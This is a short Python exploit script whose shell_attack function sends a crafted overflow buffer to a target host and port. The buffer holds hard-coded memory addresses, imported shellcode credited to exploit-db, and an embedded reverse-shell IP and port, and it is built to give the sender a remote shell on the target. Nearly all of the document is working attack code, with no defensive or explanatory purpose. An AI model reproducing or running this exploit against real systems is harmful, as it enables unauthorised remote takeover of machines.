#!/usr/bin/env python



import struct

import socket
import struct
from struct import pack
from payload import buf
def off(o):
	return struct.pack(b'L',o)
def shell_attack(target_machine, target_port):




   reverseIP = b'\xc0\xa8\x04\x34' + b'\x7a\x69' #'\xc0\xa8\x01\x0a'
   


   #shellcode from exploit-db.com, (remove the sigtrap)
  







   ebx =  0x08385908
   sc_off = 0x08385908+20

  
   buff = reverseIP +b'aaaa' + off(ebx) + b'aaaaaAAA'+ off(ebx) + buf + reverseIP + off(sc_off)  # .. and landed ;)

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
   host = target_machine   
    # connect to the socket 
   s.connect((host, target_port)) 
  
   s.send(buff)
   s.close()